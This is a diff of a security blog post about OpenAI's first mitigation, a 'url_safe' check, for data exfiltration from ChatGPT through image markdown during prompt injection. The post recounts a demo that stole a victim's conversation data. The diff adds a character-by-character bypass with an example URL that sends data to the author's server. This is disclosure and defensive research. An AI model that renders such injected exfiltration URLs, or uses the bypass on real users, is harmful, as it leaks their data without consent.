@@ -3,15 +3,15 @@
 <head prefix="og: http://ogp.me/ns#">
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
-  <meta property="og:title" content=" OpenAI mitigates data exfiltration vulnerability in ChatGPT &middot;  Embrace The Red" />
+  <meta property="og:title" content=" OpenAI mitigates data exfiltration vulnerability in ChatGPT (more improvements needed) &middot;  Embrace The Red" />
   
   <meta property="og:site_name" content="Embrace The Red" />
-  <meta property="og:url" content="https://embracethered.com/blog/posts/2023/openai-data-exfiltration-fix/" />
+  <meta property="og:url" content="https://embracethered.com/blog/posts/2023/openai-data-exfiltration-first-mitigations-implemented/" />
   
   
   <meta property="og:type" content="article" />
   
-  <meta property="og:article:published_time" content="2023-12-19T21:35:07-08:00" />
+  <meta property="og:article:published_time" content="2023-12-20T02:35:07-08:00" />
   
   <meta property="og:article:tag" content="aiml" />
   
@@ -26,7 +26,7 @@
   
 
   <title>
-     OpenAI mitigates data exfiltration vulnerability in ChatGPT &middot;  Embrace The Red
+     OpenAI mitigates data exfiltration vulnerability in ChatGPT (more improvements needed) &middot;  Embrace The Red
   </title>
 
   <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
@@ -114,13 +114,13 @@
 
 <article>
   <header>
-    <h1 class="text-primary">OpenAI mitigates data exfiltration vulnerability in ChatGPT</h1>
+    <h1 class="text-primary">OpenAI mitigates data exfiltration vulnerability in ChatGPT (more improvements needed)</h1>
     <div class="post-meta clearfix">
     
       <div class="post-date pull-left">
         Posted on
-        <time datetime="2023-12-19T21:35:07-08:00">
-          Dec 19, 2023
+        <time datetime="2023-12-20T02:35:07-08:00">
+          Dec 20, 2023
         </time>
       </div>
     
@@ -141,16 +141,17 @@
   </header>
   <section>
     <p>OpenAI seems to have implemented a first mitigation for a well-known data exfiltration vulnerability in ChatGPT. Attackers can use image markdown rendering during Prompt Injection to send data to third party servers without the users' consent.</p>
-<p>The fix is not perfect but a step into the right direction. In this post I share what I figured out so far after looking at it briefly this morning.</p>
+<p>The fix is not perfect but a step into the right direction. In this post I share what I figured out so far about the fix after looking at it briefly this morning.</p>
 <h2 id="background">Background</h2>
 <p>Yesterday I was doing a live demo of the <a href="/blog/posts/2023/openai-custom-malware-gpt/">data theft GPT</a> with a consenting victim. ChatGPT was still vulnerable to data exfiltration via image markdown injection and my server received the conversation details:</p>
 <p><a href="/blog/images/2023/openai-last.png"><img src="/blog/images/2023/openai-last.png" alt="OpenAI Raeuber"></a></p>
 <p>Needless to say and as you can read in the screenshot above (sorry it&rsquo;s in German) the user was not too amused about this.</p>
-<p>The data exfiltration vulnerability was first reported to OpenAI by myself early April 2023, but remained unaddressed.</p>
+<p>The data exfiltration vulnerability was first reported to OpenAI early April 2023, but remained unaddressed.</p>
 <p>Starting today it appears that a mitigation has been implemented. 🎉🎉🎉</p>
 <h2 id="the-mitigation">The Mitigation</h2>
-<p>It&rsquo;s a new kind of mitigation different from how other vendors fixed it. When the server returns an image tag with a hyperlink there is now a ChatGPT client side call to a validation API before deciding to display an image.</p>
-<p>This is the call to an endpoit called <code>url_safe</code>:</p>
+<p>It&rsquo;s a new kind of mitigation, different from how other vendors fixed this vulnerability.</p>
+<p>When the server returns an image tag with a hyperlink there is now a ChatGPT client side call to a validation API before deciding to display an image.</p>
+<p>The call is to an endpoit called <code>url_safe</code>:</p>
 <pre tabindex="0"><code>https://chat.openai.com/backend-api/conversation/[id]/url_safe
 </code></pre><p>where it appends the target URL as query parameter</p>
 <pre tabindex="0"><code>?url=https://wuzzi.net/r?thief=johannr@example.org
@@ -159,19 +160,33 @@
 </code></pre><p><code>safe=false</code> means that it will not render the image and perform the request to the attackers server!</p>
 <p><a href="/blog/images/2023/openai-fix-3.png"><img src="/blog/images/2023/openai-fix-3.png" alt="OpenAI Mitigation"></a></p>
 <p>It still renders <strong>other</strong> images though.</p>
-<p>Since ChatGPT is not open source and the fix is not via a Content-Security-Policy that is visible the exact validation details are not known. There is some internal decision making happening when an image is considered safe and when not, maybe ChatGPT queries the Bing index to see if an image is valid and pre-existing or have other tracking capabilities and checks.</p>
+<p>Since ChatGPT is not open source and the fix is not via a Content-Security-Policy (that is visible to users and researchers) the exact validation details are not known.</p>
+<p>There is some internal decision making happening when an image is considered safe and when not, maybe ChatGPT queries the Bing index to see if an image is valid and pre-existing or have other tracking capabilities and/or other checks.</p>
 <p><strong>This is good news.</strong></p>
-<p>As you can imagine I&rsquo;m quite happy about this improvement. Its the right thing for users and I (and others) have spent so much time this year raising awareness about this problem, and with each feature addition the risk increased (Plugins, Browsing, Code Interpreter, GPTs,&hellip;).</p>
-<p>Having a central validation API hopefully also means that Enterprises customers can configure this setting to further increase the security posture of ChatGPT for their environments.</p>
+<p>Having a central validation API hopefully also means that Enterprises customers will be able configure this setting to further increase the security posture of ChatGPT for their environments.</p>
 <h2 id="not-a-perfect-fix---remaining-concerns">Not a perfect fix - remaining concerns</h2>
-<p>As stated, it&rsquo;s not a perfect fix. It is still possible to render some requests to arbitrary domains and use it to send data out. Obvious trickeries like splitting text into individual characters and creating a request per character for instance showed some (limited) success at a first glance. But it only leaks small amounts, is slow and more noticable to a user and also to OpenAI if logs of the <code>url_safe</code> API are reviewed and monitored.</p>
-<p>This mitigation is a step in the right direction, more might be needed.</p>
+<p>As stated, it&rsquo;s not a perfect fix.</p>
+<p>It is still renders requests to arbitrary domains at times, and it can be used to send data out. Obvious trickeries like splitting text into individual characters and creating a request per character for instance showed some (limited) success at a first glance. It only leaks small amounts this way, is slow and more noticable to a user and also to OpenAI if logs of the <code>url_safe</code> API are reviewed and monitored.</p>
+<p>To give an example out of 36 characters (a-z0-9) nine of them rendered without issue, so for instance this URLs exfiltrates the letter <code>a</code> and passed the check: <code>/url_safe?url=https%3A%2F%2Fwuzzi.net%2Fimg%2Fa.png</code></p>
+<p>Here is a demo showing leaking of individual characters (from experience we know that attacks usually get better over time):</p>
+<p><a href="/blog/images/2023/openai-fix-bypass-char-by-char.png"><img src="/blog/images/2023/openai-fix-bypass-char-by-char.png" alt="OpenAI Bypass Char by Char"></a></p>
+<p>So, the current mitigation is a step in the right direction, more might be needed.</p>
 <p><strong>I would suggest to OpenAI to limit the number of images that are rendered per response to just one or maybe a handful maximum, as that will further mitigate some of the bypass trickeries.</strong></p>
-<p>Sharing the details of the validation check would also improve confidence in the mitigation, after all I hope it is not an LLM that checks if they URL is safe&hellip;</p>
+<p>Sharing the details of the validation check would also improve confidence in the mitigation, after all I hope it is not an LLM alone that checks if the URL is safe. :)</p>
 <h2 id="conclusion">Conclusion</h2>
+<ul>
+<li>
 <p>The validation check for safe URLs improves the security posture and allows OpenAI to monitor for attacks, which is good.</p>
+</li>
+<li>
 <p>The decision details on when a URL is considered safe are not known.</p>
-<p>It&rsquo;s not a 100% perfect mitigation, as some quick tests show that bits of info can steal leak, but a step in the right direction for sure.</p>
+</li>
+<li>
+<p>It&rsquo;s not a 100% perfect mitigation to prevent sending information to third party servers. Some quick tests show that bits of info can steal leak, but it is a step in the right direction for sure.</p>
+</li>
+</ul>
+<p>As you can imagine I&rsquo;m quite happy about this improvement. After the lenghty discussions I had with OpenAI in April and the many more demos I created to raise awareness across the industry and ecosystem it&rsquo;s great to see action being taken.</p>
+<p>It is the right thing for users and I (and others) have spent a lot of time raising awareness about this problem, and with each new feature risks increased (Plugins, Browsing, Code Interpreter, GPTs, GPT Store,&hellip;).</p>
 
   </section>
   <footer>
